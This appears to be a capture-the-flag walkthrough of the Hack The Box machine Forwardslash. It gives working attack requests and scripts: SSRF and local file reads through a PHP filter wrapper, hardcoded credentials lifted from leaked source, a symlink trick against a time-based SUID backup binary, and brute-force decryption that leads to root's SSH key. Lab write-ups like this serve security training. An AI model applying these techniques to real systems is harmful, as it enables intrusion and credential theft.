# Forwardslash - Hack The Box

![image]({{0xtaylur.github.io}}/assets/forwardslash/card.png)

## Summary
Forwardslash is a hard linux box that starts off with basic enumerations of vhosts, files, and directories. Using burp to perform a Server-Side Request Forgery (SSRF) vulnerability to access a protected dev directory that can only be accessed through localhost. Once I find credentials and get a shell, I exploit a backup program owned by user pain to find more credentials. Finally, I solve a crypto challenge to get root.

### Enumeration

A basic nmap scan shows 2 open ports: 22 for ssh and 80 for HTTP
```
root@kali:~/HTB/forwardslash# nmap -sC -sV -p22,80 forwardslash.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 11:28 EDT
Nmap scan report for forwardslash.htb (10.10.10.183)
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When I browse the website with it's IP address, it redirected me to`forwardslash.htb`. So I added this domain name to my local host file to use the hostname instead. It seems as the website has been defaced by **The Backslash Gang**. There are no links or html comments that would help me decide what to do next.
![image]({{0xtaylur.github.io}}/assets/forwardslash/webpage.png)

Using gobuster to scan for vhosts give us a hit for`backup.forwardslash.htb`
```
root@kali:~/HTB/forwardslash# gobuster vhost -q -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -u forwardslash.htb
Found: backup.forwardslash.htb (Status:302) [Size: 33]
```

I go to the backup subdomain to be greeted with a login page and a link to create an account.
![image]({{0xtaylur.github.io}}/assets/forwardslash/backup_login.png)
![image]({{0xtaylur.github.io}}/assets/forwardslash/signup.png)

Once I am logged in, I see a dashboard with a couple of options.
![image]({{0xtaylur.github.io}}/assets/forwardslash/dashboard.png)

I'll come back to this dashboard as I see nothing interesting yet.

After running a gobuster on the vhost, I find a`/dev`directory.
```
root@kali:~/HTB/forwardslash# gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -u backup.forwardslash.htb
/dev (Status: 301)
```

If I try to access that page I get a custom 403 error message. My IP address is shown so this could be a hint that it can only be accessed locally.
![image]({{0xtaylur.github.io}}/assets/forwardslash/denied.png)

Going back the dashboard options, I notice the option to change my profile picture has been disabled.
![image]({{0xtaylur.github.io}}/assets/forwardslash/disabled.png)

This is just disabled client-side with the`disabled`HTML tag:
```html
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
```

Using Burp, I can send a POST request to`profilepicture.php`and send it to the repeater tab. After some testing with the URL parameter, I found I was able to use SSRF and read file with it. The first thing I tried was`/etc/passwd`.
![image]({{0xtaylur.github.io}}/assets/forwardslash/burp_etc.png)

From the`/etc/passwd` file, I find two users:`chiv`and`pain`

I remember how`/dev` could not be accessed from my box. By using the http URI handler in the url parameter, I can send requests that originate from localhost to get around the IP restriction to reach an API test page. I could not find anything useful out of this, so I try to retrieve the PHP source code of`/dev/index.php`.
```
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/welcome.php
DNT: 1
Connection: close
Cookie: PHPSESSID=7pqvee5324kd0gkakssmsprjtj
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Content-Length: 16

url=///var/www/backup.forwardslash.htb/dev/index.php
```

This is the response I got:
![image]({{0xtaylur.github.io}}/assets/forwardslash/response.png)

I try to get around this by using a`PHP`wrapper and encoding it in base64.
```
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/welcome.php
DNT: 1
Connection: close
Cookie: PHPSESSID=7pqvee5324kd0gkakssmsprjtj
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Content-Length: 101

url=php://filter/convert.base64-encode/resource=file:///var/www/backup.forwardslash.htb/dev/index.php
```

We have a response encoded in base64 come back to us.
![image]({{0xtaylur.github.io}}/assets/forwardslash/base64.png)

After i've decoded the base64 string I can now see the full PHP code
```php
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
        <h1>XML Api Test</h1>
        <h3>This is our api test for when our new website gets refurbished</h3>
        <form action="/dev/index.php" method="get" id="xmltest">
                <textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
                <input type="submit">
        </form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

        $reg = '/ftp:\/\/[\s\S]*\/\"/';
        //$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

        if (preg_match($reg, $_GET['xml'], $match)) {
                $ip = explode('/', $match[0])[2];
                echo $ip;
                error_log("Connecting");

                $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

                error_log("Logging in");

                if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

                        error_log("Getting file");
                        echo ftp_get_string($conn_id, "debug.txt");
                }

                exit;
        }

        libxml_disable_entity_loader (false);
        $xmlfile = $_GET["xml"];
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $api = simplexml_import_dom($dom);
        $req = $api->request;
        echo "-----output-----<br>\r\n";
        echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

The PHP code contains credentials for the user`chiv`.
```php
if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

    error_log("Getting file");
    echo ftp_get_string($conn_id, "debug.txt");
}
```

I can now login with SSH as user`chiv`.
![image]({{0xtaylur.github.io}}/assets/forwardslash/login_chiv.png)

### Escalation to user pain
Even though I am logged in as user`chiv` I cannot read the user flag because it is owned by user`pain`. I ran LinEnum to see if I could find a way to escalate to`pain` and found a SUID binary owned by him.
```
[-] SUID files:
-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
```

Once I run the binary, it shows this output.
![image]({{0xtaylur.github.io}}/assets/forwardslash/backup_binary.png)

The generated MD5 hash in the binary output changes everytime it's executed. In the output, I notice it mentions that it's a time based backup viewer. This is why the hash is different everytime, it takes the local time and coverts it to MD5. I created a bash script to check if the MD5 value will be the same.
```bash
time="$(date + %H:%M:%S | tr -d '\n' |md5sum | tr -d ' -')"
echo $time
backup
```

I run my bash script to test and see if I was right.
![image]({{0xtaylur.github.io}}/assets/forwardslash/test_sh.png)

The MD5 value is the same, but still nothing happens. I found a file named`config.php.bak` that turns out to be the old config file from the binary we run. I edited my bash script to include the backup file.
```bash
time="$(date +%H:%M:%S | tr -d '\n' |md5sum | tr -d ' -')"
echo $time
ln -s /var/backups/config.php.bak /home/chiv/$time
backup
```

I end up with a different result that contains the credentials for`pain`.
```
chiv@forwardslash:~$ ./test.sh
f9aacbe79f6628030ffa65f21335e0d4
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 01:21:24
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

I can now login as user`pain`.

### Privilege Escalation

```
chiv@forwardslash:~$ su - pain
Password: 
pain@forwardslash:~$ 
```

I can now read the`user.txt`file.

![image]({{0xtaylur.github.io}}/assets/forwardslash/user.png)

The user`pain`can run the following commands with no password.
![image]({{0xtaylur.github.io}}/assets/forwardslash/sudol.png)

In the home directory, I find a python script named encrypter.py and a text file named ciphertext in the directory encryptorinator. These are the python script contents:
```py
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

After a bit on analyzing, I was able to decrypt with my own python script.

```py
def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)

ciphertext = open('ciphertext', 'r').read().rstrip()
for i in range(1, 165):
    for j in range(33, 127):
        key = chr(j) * i
        msg = decrypt(key, ciphertext)
        if 'the ' in msg or 'be ' in msg or 'and ' in msg or 'of ' in msg :
            exit("Key: {0}, Msg: {2}".format(key, len(key), msg))
```

Once I run my script, we get a key and a message.
```
pain@forwardslash:~/encryptorinator$ python2 d.py 
Key: ttttttttttttttttt, Msg: Hl��vF��;�������&you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
```

Going into the directory`/var/backups/recovery`I am now able to map the img file named`encrypted_backup.img`
![image]({{0xtaylur.github.io}}/assets/forwardslash/mapbackup.png)

The backup file goes into the`/dev/mapper`directory. I can then mount the backup img file to see the contents inside.
![image]({{0xtaylur.github.io}}/assets/forwardslash/foundrsa.png)

I find the root ssh private key and put it on my host machine. I can now login as`root` and grab the root flag.
![image]({{0xtaylur.github.io}}/assets/forwardslash/root.png)
